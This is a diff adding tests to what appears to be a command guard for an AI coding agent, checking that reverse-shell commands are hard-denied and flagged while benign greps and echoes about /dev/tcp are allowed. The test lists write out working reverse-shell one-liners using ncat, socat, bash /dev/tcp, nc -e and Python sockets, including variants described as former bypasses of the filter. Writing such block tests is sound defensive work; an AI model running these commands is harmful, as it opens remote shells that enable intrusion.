@@ -161,3 +161,57 @@ def test_write_with_pi_like_content_not_blocked():
         pol,
     )
     assert d.permission == "allow", "write of PI-looking content must not self-block"
+
+
+# --- audit fixes: reverse-shell FP narrowing + bypass closure -----------------
+REVSHELL_BYPASS_NOW_CAUGHT = [
+    "ncat --exec /bin/sh 10.0.0.1 4444",
+    "ncat --sh-exec '/bin/bash -i' 10.0.0.1 4444",
+    "ncat --lua-exec rev.lua 10.0.0.1 4444",
+    "socat tcp-connect:10.0.0.1:9001 system:/bin/bash",
+    "socat TCP:10.0.0.1:9001 EXEC:/bin/sh",
+]
+REVSHELL_STILL_CAUGHT = [
+    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "exec 5<>/dev/tcp/10.0.0.1/9001",
+    "nc -e /bin/sh 10.0.0.1 4444",
+    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'",
+]
+REVSHELL_FP_NOW_ALLOWED = [
+    "grep -rn /dev/tcp/ docs/",                       # searching for the pattern, not using it
+    "cat reverse_shell_notes.md | grep /dev/tcp/",    # path is a grep ARG, no redirect
+    "python3 train.py  # uses socket and subprocess",  # benign mention, no inline -c
+    "rg '/dev/tcp' src/",                              # ripgrep over source
+    "echo 'reverse shell uses /dev/tcp/host/port'",   # documenting the technique
+]
+
+
+def test_revshell_bypasses_now_hard_blocked():
+    for cmd in REVSHELL_BYPASS_NOW_CAUGHT:
+        d = _decide_bash(cmd, _observe())
+        assert d.permission == "deny" and d.hard_deny, f"BYPASS still passes: {cmd!r}"
+        assert d.rule_id == "hard.reverse_shell"
+
+
+def test_revshell_real_attacks_still_hard_blocked():
+    for cmd in REVSHELL_STILL_CAUGHT:
+        d = _decide_bash(cmd, _observe())
+        assert d.permission == "deny" and d.hard_deny, f"REGRESSION, real attack missed: {cmd!r}"
+
+
+def test_revshell_fp_no_longer_hard_blocks_legit_work():
+    for cmd in REVSHELL_FP_NOW_ALLOWED:
+        d = _decide_bash(cmd, _observe())
+        assert not d.hard_deny, f"FALSE hard-block on legit work: {cmd!r} → {d.rule_id}"
+
+
+def test_revshell_signal_mirrors_enforce():
+    # the c2.reverse_shell DETECTION signal must agree with the hard-deny rule
+    from ccguard.agent.signals.extractor import extract_signals
+    caught = REVSHELL_BYPASS_NOW_CAUGHT + REVSHELL_STILL_CAUGHT
+    for cmd in caught:
+        sigs = set(extract_signals("Bash", {"command": cmd}))
+        assert "c2.reverse_shell" in sigs, f"signal missed: {cmd!r}"
+    for cmd in REVSHELL_FP_NOW_ALLOWED:
+        sigs = set(extract_signals("Bash", {"command": cmd}))
+        assert "c2.reverse_shell" not in sigs, f"signal FP: {cmd!r}"
